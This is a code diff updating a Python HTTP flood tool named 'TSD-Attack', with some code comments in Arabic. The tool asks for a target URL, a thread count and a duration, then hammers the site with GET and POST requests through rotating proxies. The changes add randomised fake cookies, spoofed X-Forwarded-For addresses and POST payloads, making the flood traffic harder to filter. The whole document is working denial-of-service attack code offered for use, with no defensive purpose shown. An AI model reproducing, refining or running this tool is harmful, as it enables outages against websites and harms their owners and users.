@@ -16,7 +16,7 @@ from halo import Halo
 
 os.system('clear')
 
-version = "5.2"
+version = "5.3 [ BETA ]"
 method = "HTTP PROXY"
 
 sip = Halo()
@@ -42,6 +42,16 @@ print('_'*60)
 fake = faker.Faker()
 
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
+
+def generate_random_cookies() -> Dict[str, str]:
+    """Generate random cookies."""
+    cookie_count = random.randint(1, 5)  # عدد الكوكيز العشوائية
+    cookies = {}
+    for _ in range(cookie_count):
+        key = ''.join(random.choices(string.ascii_letters, k=random.randint(3, 8)))
+        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
+        cookies[key] = value
+    return cookies
 
 def get_http_proxies() -> List[Dict[str, str]]:
     proxies = []
@@ -82,6 +92,8 @@ proxies = get_http_proxies()
 ua = UserAgent()
 
 def generate_headers():
+    cookies = generate_random_cookies()  # توليد ملفات تعريف الارتباط
+    cookie_header = '; '.join([f"{key}={value}" for key, value in cookies.items()])  # تنسيق ملفات تعريف الارتباط
     return {
         "User-Agent": ua.random,
         "X-Requested-With": "XMLHttpRequest",
@@ -100,23 +112,23 @@ def generate_headers():
         "Sec-Fetch-User": "?1",
         "Sec-Fetch-Dest": "document",
         "X-Forwarded-For": fake.ipv4(),
+        "Cookie": cookie_header  # إضافة ملفات تعريف الارتباط للرؤوس
     }
 
 def buildBlock(size):
 
-    block = ''.join(random.choice(string.ascii_letters) for _ in range(size))
+    block = ''.join(random.choice(string.ascii_letters) + random.choice(string.digits) for _ in range(size))
+    return block
     return block
 
-
 def generateRandData():
-
     return {
-        "q": buildBlock(size=random.randint(10,20))+buildBlock(size=random.randint(10,20)),
+        "q": buildBlock(size=random.randint(5,10))+buildBlock(size=random.randint(5,10)),
     }
 
 def flood(target: str) -> None:
     global proxies
-    
+
     type_request = random.choice([
         "GET",
         "POST"
@@ -125,14 +137,13 @@ def flood(target: str) -> None:
     headers = generate_headers()
     paramsGet = generateRandData()
     while True:
-        
         try:
             proxy = random.choice(proxies)
 
             if type_request == "GET":
                 response = requests.get(target, headers=headers, params=paramsGet ,proxies=proxy, timeout=5)
             else:
-                response = requests.post(target, headers=headers, proxies=proxy, timeout=5)
+                response = requests.post(target, data=paramsGet,headers=headers,proxies=proxy, timeout=5)
             status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
             payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
             proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
@@ -160,22 +171,18 @@ def start_flooding(target: str, thread_count: int, duration: int) -> None:
     print(f"\n{F.CYAN}( Done ) {F.GREEN}Attack finished after {F.RED}{duration} seconds.{F.RESET}")
 
 if __name__ == "__main__":
-
     target_url = input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Enter Url{F.CYAN})
 └──╼ {F.YELLOW}~: {F.GREEN}''')
-    num_threads = int(input(f'''\n{F. CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Threads{F.CYAN})
+    num_threads = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Threads{F.CYAN})
 └──╼ {F.YELLOW}~: {F.GREEN}'''))
     duration = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Time Attack{F.CYAN})
 └──╼ {F.YELLOW}~: {F.GREEN}'''))
-    
+
     print(f"""
-- {F.GREEN} Attack On {F.RED} {target_url} {F.RESET}
-- {F.GREEN}Time attack : {F.RED}{duration}{F.RESET}
-\n
+- {F.RED} Attack on {F.GREEN}{target_url}{F.RED} for {F.GREEN}{duration}{F.RED} seconds using {F.GREEN}{num_threads}{F.RED} threads
 """)
-    sipp= Halo(text="Loding ...", spinner="dots")
+    sipp = Halo(text="Loding ...", spinner="dots")
     sipp.start()
     time.sleep(3)
     sipp.stop()
     start_flooding(target_url, num_threads, duration)
-
